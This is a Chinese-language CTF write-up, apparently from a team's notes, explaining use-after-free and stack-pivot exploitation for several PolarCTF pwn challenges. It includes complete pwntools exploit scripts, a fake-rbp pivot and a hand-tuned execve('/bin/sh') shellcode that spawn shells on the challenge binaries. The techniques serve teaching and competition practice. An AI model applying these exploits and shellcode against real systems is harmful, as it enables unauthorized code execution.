# 一些做题知识

## use after free（UAF)

use after free 是堆中常见的漏洞，也是属于比较简单的堆题，出现漏洞的原因是由于free()函数执行后并没有将目标指针重新设置为零，造成出现野指针的现象，这时就能通过再次申请相同大小的堆块获得之前申请过的该大小的堆块，这样我们可以对该堆块的内容进行改写比如改成后门函数的地址，如果程序执行该处的内容就能获得shell

下面以一个简单的c程序演示，先放上代码

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
	void*ptr1 =(void*) malloc(0x10);	
	printf("ptr1:%p\n",ptr1);
	

	free(ptr1);
	void*ptr2 =(void*) malloc(0x10);
	printf("ptr2:%p",ptr2);
	return 0;

}
```

可以看到我释放了ptr1但没有将指针清零导致构成UAF漏洞，当再次申请相同的0x10堆块给ptr2时，由于ptr1未被置零则ptr2拿到与ptr1相同的堆块即ptr2=ptr1

![](/n0va6/assets/gitbook/images/image-20250804161353287.png)

实例：like_it

# 题目

## 简单

### like_it

![](/n0va6/assets/gitbook/images/image-20250804173926420.png)

一道菜单题，方便起见，分别把1到3的函数称为add，delete，show，首先查看一下add函数

![](/n0va6/assets/gitbook/images/image-20250804174209285.png)

分析一下不难发现，函数的主要逻辑是遍历notelist链表，如果链表某个节点为空那么就在该处申请0x10大小的堆块，接着将print函数的地址存储到堆块的user data的前8字节区域(前面有0x10大小的chunk_header)，然后输入接下来申请堆块的大小，接着在user data+8字节处再申请一个堆块，最后read将用户输入的内容读入到其中

delete函数

![](/n0va6/assets/gitbook/images/Snipaste_2025-08-04_17-54-06.png)

可以看到delete函数中free了两次，但都没有将相应的指针清零，构成UAF漏洞可以利用

show函数

![](/n0va6/assets/gitbook/images/image-20250804175822860.png)

输入堆块索引，调用堆块中存储的print函数

程序还给了magic函数

![](/n0va6/assets/gitbook/images/image-20250804180235954.png)

以上为主要函数逻辑

利用思路：

可以利用delete函数中的UAF漏洞进行利用，先申请两个大堆块(执行两次add函数，实际上堆块中包含堆块，一共4个)把第一个大堆块称为chunk0，第二个称为chunk1，申请chunk0中堆块时，内容可以随便输入，大小可为0x18,0x20,0x28...，但不能为0x10，否则后面利用UAF的时候就无法申请到print函数所在堆块的位置，不能对其进行修改，同样chunk1也不能申请0x10的堆块

```
from pwn import*

context(arch='amd64',os='linux',log_level='debug')

#p=remote('1.95.36.136',2055)
p=process('./like_it')


def add(size,content):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Note size :')
    p.sendline(str(size))
    p.recvuntil(b'Content :')
    p.sendline(content)

def delete(index):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(str(index))

def show(index):
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Index :')
    p.sendline(str(index))

p.recvuntil(b'Hi! What do you like?')
p.sendline(b'hi,everyone')

magic=0x400cB5

add(0x20,b'aaa')#chunk0
add(0x20,b'bbb')#chunk1
```

这道题比较少见，有个def函数，里面禁用了gdb的调试功能，导致无法调试，没办法展示调试过程了。。。

然后再把申请的两个chunk给free掉，此时4个chunk中的两个0x20，两个0x30(包含了chunk_head)全处于释放状态，且位于fastbin中的0x20和0x30链表中

```
delete(1)
delete(0)
```

这里释放的顺序需要注意下，由于fastbin是单项链表，遵循先进后出的原理，所以此时两个0x20大小的free_chunk状态是

chunk0->chunk1

接下来再把两个0x20大小的chunk申请回来，add函数中第一个已经帮我们申请了0x10(chunk0)，只要在申请0x10大小(chunk1)就能申请回来，那么此时的chunk0和chunk1都指向print所在位置，且chunk1可以让我们进行修改，把它改为magic，然后再调用show(1)，执行magic拿到flag

```
add(0x10,p64(magic))
show(1)
```

完整exp

```
from pwn import*

context(arch='amd64',os='linux',log_level='debug')

#p=remote('1.95.36.136',2055)
p=process('./like_it')


def add(size,content):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Note size :')
    p.sendline(str(size))
    p.recvuntil(b'Content :')
    p.sendline(content)

def delete(index):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(str(index))

def show(index):
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Index :')
    p.sendline(str(index))

p.recvuntil(b'Hi! What do you like?')
p.sendline(b'hi,everyone')

magic=0x400cB5

add(0x20,b'aaa')#chunk0
add(0x20,b'bbb')#chunk1
delete(1)
delete(0)
add(0x10,p64(magic))
show(0)
p.interactive()
```

## 困难

### 8字节能干什么

![image-20250815171755875](/n0va6/assets/gitbook/images/image-20250815171755875.png)

两次读入且每次都能覆盖ebp和返回地址，printf打印结果，容易考虑到栈迁移，而且程序给了system函数，把system写入栈上，在栈迁移到system，并写入/bin/sh执行即可

要迁移到栈就需要知道栈地址，而通过打印ebp的值再减去偏移就能获得栈上的任意地址

利用第一次读入输出ebp

exp

```
from pwn import*
context(arch='i386',os='linux',log_level='debug')

#p=remote('1.95.36.136',2131)
p=process('./pwn')

leave_ret=0x8048488
system=0x80483E0
payload=b'a'*(0x30)
p.send(payload)#这里注意用send，sendline的'\n'会将ebp低字节覆盖
p.recvuntil(b'a'*(0x30))
ebp=u32(p.recv(4))
print('ebp>',hex(ebp))
```

![](/n0va6/assets/gitbook/images/屏幕截图 2025-08-15 172746.png)

通过调试确定输入的起始地址(buf)

![](/n0va6/assets/gitbook/images/Snipaste_2025-08-15_17-36-54.png)

print_addr是输出的地址，与起始地址之间的偏移为0x40，减去0x40即可得到起始地址

第二次读入则构造栈迁移

```
payload=b'aaaa'+p32(system)+p32(0)+p32(buf+0x10)+b'/bin/sh'
payload=payload.ljust(0x30,b'\x00')+p32(buf)+p32(leave_ret)
```

前面4个a用来应对对第二次pop ebp;确保system被pop eip;把/bin/sh写入到距输入点(buf)0x10的位置作为参数，最后再利用栈迁移到system

完整exp

```
from pwn import*
context(arch='i386',os='linux',log_level='debug')

#p=remote('1.95.36.136',2131)
p=process('./pwn')

leave_ret=0x8048488
system=0x80483E0
payload=b'a'*(0x30)
#gdb.attach(p)
p.send(payload)
#pause()
p.recvuntil(b'a'*(0x30))
ebp=u32(p.recv(4))
print('ebp>',hex(ebp))
buf=ebp-0x40
payload=b'aaaa'+p32(system)+p32(0)+p32(buf+0x10)+b'/bin/sh'
payload=payload.ljust(0x30,b'\x00')+p32(buf)+p32(leave_ret)
p.sendline(payload)
p.interactive()
```

### stack

![image-20250814192138672](/n0va6/assets/gitbook/images/image-20250814192138672.png)

只能覆盖掉rbp，由此想到通过覆盖掉rbp，把栈迁移

![](/n0va6/assets/gitbook/images/image-20250814192323327.png)



显然，想要执行system必须满足两个条件，而我们只能控制v4的值，因此要让rbp-4与passwd指向同一地址，伪造rbp为&passwd-4，则能同时满足

exp

```
from pwn import*
context(arch='amd64',os='linux',log_level='debug')

#p=remote('1.95.36.136',2100)
p=process('./stack')

rbp=0x4033CC+4
payload=b'a'*(0x50)+p64(rbp)
#gdb.attach(p)
#pause()
p.sendline(payload)
p.recvuntil(b'input1:')

p.sendline(b'4660')

p.interactive()
```

### bllbl_shellcode4

分析程序可知主要提供两个函数，先来看sub_401216

![image-20250812192656281](/n0va6/assets/gitbook/images/image-20250812192656281.png)

mprotect函数使得0x4040c0地址开始(包括之前)的bss段都可执行，且给了/bin/sh的地址

再看sub_401306

![](/n0va6/assets/gitbook/images/image-20250812192656281.png)

显然可以进行栈溢出但长度不够，于是想到先迁移到bss可执行段，再编写shellcode控制程序执行

exp

```
from pwn import*
context(arch='amd64',os='linux',log_level='debug')

#p=remote('1.95.36.136',2104)
p=process('./pwn1')
elf=ELF('./pwn1')

bss=0x4040C0
read=0x401335
sub_rsp_x15=0x40136A
bin_sh=0x40203F

payload=b'a'*9+p64(bss)+p64(read)
p.recvuntil(b'welcome to PolarCTF Summer Games')
p.sendline(payload)
```

值得注意的是有个隐藏函数提供了一个有用的gadget

![](/n0va6/assets/gitbook/images/Snipaste_2025-08-12_19-33-28.png)

这样在编写shellcode时可以利用这个gadget跳转回去执行我们的代码

本题的难点就在于怎么编写shellcode，使其能够跳转到合理的位置执行代码

我们首先通过pop一个bss可执行段上的地址当做伪造的rbp，再返回read函数开始传参的地址

![](/n0va6/assets/gitbook/images/Snipaste_2025-08-13_11-22-45.png)

![](/n0va6/assets/gitbook/images/Snipaste_2025-08-13_11-25-16.png)

上述代码执行后就会将我们给的bss-9当做输入的起始地址，然后接下来就是编写shellcode了

bss-9加上伪造的rbp一共占17个字节(这一段用来构造shellcode)，接下来的返回地址就要覆盖成sub_rsp_x15返回去执行shellcode，但具体会返回到哪个位置，调试一下会更清楚

先看下这部分的exp，shellcode稍后解释

```
shellcode='''
nop;
nop;
nop;
nop;
mov al,0x3b;
mov edi,0x40203F;
mov esi,ebx;
mov edx,esi;
syscall;
'''
shellcode=asm(shellcode)
print('shellcode>>',len(shellcode))
shellcode+=p64(sub_rsp_x15)
gdb.attach(p)
p.sendline(shellcode)
pause()
p.interactive()
```

这里其实是需要控制shellcode刚好是17个字节这样后面才能覆盖返回地址，方便起见我编写的shellcode就刚好到了17字节(其实是需要进行各种尝试控制shellcode到17字节)，然后接下来进行调试

![](/n0va6/assets/gitbook/images/Snipaste_2025-08-13_11-47-42.png)

第二次read后执行到ret处，此时的rsp指向0x4040c8，存储的正是我们覆盖的返回地址0x40136a，执行后

![](/n0va6/assets/gitbook/images/屏幕截图 2025-08-13 115137.png)

jmp rsp执行后

![](/n0va6/assets/gitbook/images/屏幕截图 2025-08-13 115532.png)

 这里实际上是跳过了前面4个nop空指令，至于为什么要用到4个空指令，其是因为执行完返回地址后rsp来到了距输入点9+8+8=0x19的位置，而此时的rip将执行sub rsp 0x15;执行完jmp rsp;后来到距输入点0x19-0x15=0x4的位置，即我们需要将前4个字节填充为空指令才能正确执行shellcode，接下来就只能将后续shellcode编写到17-4=13字节，就需要尽可能的缩短shellcode长度，凑巧的是按照如下编写

```
shellcode='''
nop;
nop;
nop;
nop;
mov al,0x3b;
mov edi,0x40203F;
mov esi,ebx;
mov edx,esi;
syscall;
'''
```

除去前面4个nop，后面长度刚好达到13字节，满足我们对shellcode的要求(这个地方还是需要不断尝试的)这里推荐一个汇编转机器语的网站

[汇编](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+eax%2C0x3b&arch=x86-64&as_format=hex#assembly)

完整exp

```
from pwn import*
context(arch='amd64',os='linux',log_level='debug')

#p=remote('1.95.36.136',2104)
p=process('./pwn1')
elf=ELF('./pwn1')

bss=0x4040C0
read=0x401335
sub_rsp_x15=0x40136A
bin_sh=0x40203F

payload=b'a'*9+p64(bss)+p64(read)
p.recvuntil(b'welcome to PolarCTF Summer Games')
#gdb.attach(p)
p.sendline(payload)
#pause()

shellcode='''
nop;
nop;
nop;
nop;
mov al,0x3b;
mov edi,0x40203F;
mov esi,ecx;
mov edx,ecx;
syscall;
'''
shellcode=asm(shellcode)
print('shellcode>>',len(shellcode))
shellcode+=p64(sub_rsp_x15)
#gdb.attach(p)
p.sendline(shellcode)
#pause
p.interactive()
```

还有个需要注意的点是execve函数的第二三个参数要控制为0需要找到合适的寄存器，本地环境和远程略有不同，本地执行到shellcode时ecx为0(如上exp)，而远程则ebx为0，可能与所用虚拟机不容，不管怎样，[多尝试几个寄存器就好啦]()
